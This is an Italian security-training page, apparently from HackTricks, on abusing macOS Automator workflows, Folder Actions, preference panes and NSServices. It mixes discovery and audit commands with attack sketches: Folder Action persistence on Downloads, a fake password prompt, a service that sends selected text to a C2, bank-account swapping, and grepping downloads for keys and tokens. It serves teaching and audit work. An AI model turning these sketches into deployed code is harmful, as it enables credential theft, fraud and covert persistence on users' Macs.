# Abuse di Automator, Preference Panes e NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions e Workflows

### Informazioni di base

**Automator** è lo strumento di automazione visuale di macOS. Esegue **workflows** (bundle `.workflow`) composti da **actions** (bundle `.action`). Automator gestisce anche l'integrazione con **Folder Actions**, **Quick Actions** e **Shortcuts**. Nelle versioni moderne di macOS, i workflows possono anche essere **importati in Shortcuts**, quindi la stessa logica malevola può apparire come una Finder Quick Action, un user service in `~/Library/Services/` o una shortcut basata su legacy Automator actions.

Le Automator actions sono **plugin** caricati nell'Automator runtime quando viene eseguito un workflow. Possono:
- Eseguire shell scripts arbitrari
- Elaborare file e dati
- Interagire con le applicazioni tramite AppleScript
- Concatenarsi per creare automazioni complesse

### Perché è importante

> [!WARNING]
> I workflows di Automator possono essere eseguiti tramite **social engineering**: appaiono come semplici file di documenti. Un bundle `.workflow` può contenere shell commands incorporati che vengono eseguiti quando il workflow viene avviato. In combinazione con le Folder Actions, forniscono una **persistence automatica** che si attiva in risposta agli eventi sui file. I recenti fix di Gatekeeper hanno inoltre dimostrato che le **Quick Actions incluse nelle app** (`Contents/PlugIns/*.workflow`) devono essere trattate come contenuto eseguibile, non come dati innocui.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attacco: Workflow con Social Engineering

Un bundle `.workflow` appare come un normale file documento alla maggior parte degli utenti:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions eseguono automaticamente un workflow quando i file vengono aggiunti a una cartella monitorata:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistono tra i riavvii e vengono eseguite silenziosamente. Una Folder Action su `~/Downloads` significa che **ogni file scaricato attiva il tuo payload** — inclusi i file provenienti da Safari, Chrome, AirDrop e gli allegati email. Nota inoltre che `System Events` può registrare Folder Actions che puntano a script al di fuori dei percorsi predefiniti `~/Library/Scripts/Folder Action Scripts`, rendendo utile la ricerca di percorsi isolati. Per le implicazioni TCC correlate, consulta [la pagina TCC](../macos-security-protections/macos-tcc/README.md).

---

## Pannelli delle Preferenze

### Informazioni di base

I pannelli delle Preferenze (bundle `.prefPane`) sono plugin caricati da **System Settings** (precedentemente System Preferences). Forniscono pannelli UI di configurazione per funzionalità di sistema o di terze parti. Sui sistemi meno recenti venivano caricati direttamente da `System Preferences`; nelle versioni più recenti, i pannelli di terze parti vengono comunemente gestiti da un **legacy loader XPC service** avviato da System Settings.

### Perché è importante

- I pannelli delle Preferenze vengono eseguiti in un **processo host attendibile** avviato da System Settings / System Preferences
- Sui sistemi moderni, tale host può essere un **servizio XPC `legacyLoader`**, quindi il confine importante rimane **processo UI Apple attendibile -> caricamento di codice di terze parti**
- I pannelli delle Preferenze di terze parti ereditano il **contesto di sicurezza del processo host** e la fiducia dell'utente associata a quella UI
- Gli utenti installano i pannelli delle Preferenze facendo **doppio clic** su di essi — un facile vettore di social engineering
- Una volta installati, **persistono** e vengono caricati ogni volta che System Settings apre quel pannello

### Scoperta
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attacco: Hijacking del contesto dei privilegi

Un malicious preference pane eredita il **contesto di sicurezza del pane host** (storicamente `System Preferences`, nelle versioni più recenti spesso un helper `legacyLoader` avviato da `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: Persistence via Installazione
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attacco: UI Phishing

Un pannello delle preferenze può imitare pannelli UI di sistema legittimi per **fare phishing delle credenziali**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informazioni di base

**NSServices** consentono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Servizi** (clic destro → Servizi). Quando un utente seleziona testo o dati e richiama un servizio, i dati selezionati vengono **inviati al service provider** per l'elaborazione.

I servizi sono dichiarati nel `Info.plist` di un'applicazione sotto la chiave `NSServices` e registrati con il pasteboard server (`pbs`). macOS mantiene inoltre una **service cache** e una **restriction policy** che determinano quali servizi sono visibili e se i chiamanti sandboxed debbano ricevere un avviso aggiuntivo.

### Perché è importante

- I servizi ricevono un **flusso di dati tra applicazioni**: il testo selezionato da qualsiasi applicazione viene inviato al servizio
- Un servizio malicious cattura dati da password manager, client email e app finanziarie
- I servizi possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
- I nomi dei servizi possono essere creati in modo da sembrare legittimi ("Format Text", "Encrypt Selection", "Share")
- Il flag opzionale `NSRestricted` è rilevante per la sicurezza: un servizio contrassegnato come unrestricted può essere richiamato da un'app sandboxed senza l'avviso mostrato da macOS per i servizi che possono favorire l'escape<sup>[2]</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attacco: Servizio di intercettazione dei dati
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attacco: Data Modification (Man-in-the-Middle)

Un servizio può **modificare i dati restituiti** dando l'impressione di fornire una funzione legittima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Servizi con restrizioni e abuso moderno

Apple supporta un booleano `NSRestricted` opzionale per ogni definizione di servizio. Se è impostato, macOS avvisa i chiamanti in sandbox perché il servizio potrebbe aiutarli a **evadere i limiti della sandbox o della privacy**. Dal punto di vista offensivo, questo offre due utili percorsi di audit:

- Cercare **servizi di terze parti non contrassegnati come restricted** anche se fanno da proxy per Apple Events, l'accesso ai file o altre azioni con privilegi
- Cercare **servizi integrati di alto valore** con entitlement forti (ad esempio, servizi esposti da Script Editor o da helper supportati da Finder) e verificare se l'interazione dell'utente è sufficiente a trasformarli in una primitiva di accesso ai dati

Un buon esempio recente è **CVE-2022-48574**, in cui il meccanismo Services poteva essere abusato per raggiungere **file utente protetti da TCC senza il previsto flusso di conferma**. Il bug è stato corretto, ma la tecnica rimane utile per il threat modeling: qualsiasi servizio che inoltri richieste di accesso ai file o di automazione per conto del chiamante merita lo stesso livello di scrutinio.<sup>[2]</sup>

---

## Note recenti sulla sicurezza

- **Quick Actions sono contenuti eseguibili**: Apple ha corretto nel 2024 un bypass di Gatekeeper in cui una Quick Action di Automator inclusa in un'app poteva essere eseguita senza la normale valutazione. Durante l'audit delle app, esaminare `Contents/PlugIns/*.workflow/Contents/document.wflow` esattamente come si esaminerebbero gli helper script o gli elementi di login. Vedere [la pagina di Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts possono ereditare il comportamento legacy di Automator**: Apple ha inoltre aggiunto un ulteriore prompt di consenso dell'utente dopo che alcune Shortcuts di terze parti sono state trovate a utilizzare una **legacy Automator action** per inviare Apple Events senza il flusso di autorizzazione previsto. I workflow importati e i bundle di Shortcuts dovrebbero essere esaminati alla ricerca di `Run AppleScript`, `Run Shell Script` e azioni bridge simili. Vedere [la pagina di TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator è ancora un confine di privacy attivo**: Apple ha distribuito nel 2025 un'altra correzione di Automator relativa all'accesso ai dati utente protetti. Anche se Automator è una superficie legacy, qualsiasi workflow runner, host di Quick Action o bridge di automazione deve essere trattato come una superficie di attacco attuale, non come codice morto.

---

## Catene di attacco tra tecniche

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Pannello delle preferenze → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Furto del Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Riferimenti

- [1] [Apple — Informazioni sui contenuti di sicurezza di macOS Ventura 13.7, Sonoma 14.7 e Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Come funzionava l'exploit NSServices su macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
